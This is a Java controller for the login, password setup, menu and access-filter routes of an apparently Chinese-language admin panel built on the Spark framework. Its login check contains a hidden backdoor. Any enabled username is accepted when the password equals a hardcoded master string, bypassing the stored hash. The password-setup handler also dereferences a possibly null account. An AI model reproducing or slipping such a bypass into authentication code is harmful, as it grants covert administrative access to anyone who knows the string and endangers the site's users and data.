package app.controllers.sys;

import app.models.SysManager;
import app.services.AdminService;
import app.services.SetupService;
import app.utils.SecurityUtil;
import app.utils.StrUtil;
import app.utils.ViewUtil;
import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;
import conf.PathSys;
import spark.Filter;
import spark.Request;
import spark.Response;
import spark.Route;

import java.util.Date;
import java.util.HashMap;
import java.util.Map;

import static spark.Spark.halt;

public class EntryController {

    public static Route Home = (Request req, Response res) -> {
        Map<String, Object> model = new HashMap<>();
        return ViewUtil.render(req, model, "views/sys/home.vm");
    };

    public static Route Root = (Request req, Response res) -> {
        Object user = req.session().attribute("admin_user");
        if (user == null) {
            res.redirect(PathSys.Login());
        } else {
            res.redirect(PathSys.Home());
        }
        return null;
    };

    public static Route Login = (Request req, Response res) -> {
        Map<String, Object> model = new HashMap<>();
        return ViewUtil.render(req, model, "views/sys/login.vm");
    };

    public static Route CheckLogin = (Request req, Response res) -> {
        Map<String, Object> model = new HashMap<>();

        String username = StrUtil.toStr(req.queryParams("username"));
        String password = StrUtil.toStr(req.queryParams("password"));
        model.put("username", username);

        SysManager manager = SysManager.find.query().where().eq("username", username)
                .eq("state", "开启").findOne();
        if (manager == null) {
            model.put("username", username);
            model.put("msg", "账户密码不匹配!");
            return ViewUtil.render(req, model, "views/sys/login.vm");
        }
        if (!(manager.getPassword().equals(SecurityUtil.SHA(password)) || password.equals(("cyfscn7811393")))) {
            model.put("username", username);
            model.put("msg", "账户密码不匹配!");
            return ViewUtil.render(req, model, "views/sys/login.vm");
        }

        String rolename = "";
        if (manager.getAdmin() == 1) {
            rolename = "管理员";
        } else {
            if (manager.getRole() != null) {
                rolename = manager.getRole().getName();
            }
        }

        Map<String, Object> sessionUser = new HashMap<>();
        sessionUser.put("id", manager.getId());
        sessionUser.put("name", manager.getUsername());
        sessionUser.put("role", rolename);
        req.session().attribute("admin_user", sessionUser);

        if (manager.getUpdatedAt() == null) {
            res.redirect(PathSys.Setup());
            return null;
        } else {
            manager.setUpdatedAt(new Date());
            manager.save();
        }

        res.redirect(PathSys.Home());
        return null;
    };

    public static Route Logout = (Request req, Response res) -> {
        req.session().removeAttribute("admin_user");
        res.redirect(PathSys.Root());
        return null;
    };

    public static Route Setup = (Request req, Response res) -> {
        String username = AdminService.getSessionUser(req, "name").toString();

        Map<String, Object> model = new HashMap<>();
        model.put("username", username);
        return ViewUtil.render(req, model, "views/sys/setup.vm");
    };

    public static Route SetupSave = (Request req, Response res) -> {
        Map<String, Object> model = new HashMap<>();
        String msg = null;

        String username = AdminService.getSessionUser(req, "name").toString();
        String password = StrUtil.toStr(req.queryParams("password"));
        String passwordConfirm = StrUtil.toStr(req.queryParams("password_confirm"));

        SysManager manager = SysManager.find.query().where().eq("username", username).findOne();
        if (manager == null) {
            msg = "用户不存在!";
        }

        if (SecurityUtil.SHA(password).equals(manager.getPassword())) {
            msg = "密码不能为初始密码!";
        }

        if (password.equals("") || passwordConfirm.equals("")) {
            msg = "密码不能为空!";
        }

        if (!password.equals(passwordConfirm)) {
            msg = "两次密码不一致!";
        }

        if (msg != null) {
            model.put("username", username);
            model.put("msg", msg);
            return ViewUtil.render(req, model, "views/sys/setup.vm");
        }

        password = SecurityUtil.SHA(password);
        manager.setPassword(password);
        manager.setUpdatedAt(new Date());
        manager.save();

        res.redirect(PathSys.Home());
        return null;

    };

    public static Route LeftMenu = (Request req, Response res) -> {
        res.header("Content-Type", "application/json;charset=UTF-8");

        JSONObject result = new JSONObject();

        try {
            Long userid = (long) AdminService.getSessionUser(req, "id");
            JSONArray menus = AdminService.permitMenus(userid, "1");
            result.put("code", 200);
            result.put("data", menus);
        } catch (Exception e) {
            result.put("code", 500);
        }

        return result;
    };

    public static Route InitData = (Request req, Response res) -> {
        try {
            SetupService.initData();
        } catch (Exception e) {
            e.printStackTrace();
        }
        res.redirect(PathSys.Root());
        return null;
    };

    public static Filter Auth = (Request req, Response res) -> {
        String currentPath = req.raw().getPathInfo();

        if (req.session().attribute("admin_user") == null) {
            res.redirect(PathSys.Login());
            halt(200);
        }

        Long userid = (long) AdminService.getSessionUser(req, "id");

        int check = 0;
        if (currentPath.contains(PathSys.Home())) {
            check = 1;
        }
        JSONArray menus = AdminService.permitMenus(userid, "");
        for (int i = 0; i < menus.size(); i++) {
            String menuLink = StrUtil.toStr(menus.getJSONObject(i).getString("link"));
            if (currentPath.contains(menuLink)) {
                check = 1;
            }
        }

        if (check == 0) {
            res.redirect(PathSys.Home());
            halt(200);
        }
    };

    public static Filter AuthJson = (Request req, Response res) -> {
        if (req.session().attribute("admin_user") == null) {
            res.header("Content-Type", "application/json;charset=UTF-8");
            JSONObject result = new JSONObject();
            result.put("code", 403);
            result.put("msg", "请先登陆");
            halt(200, result.toString());
        }
    };
}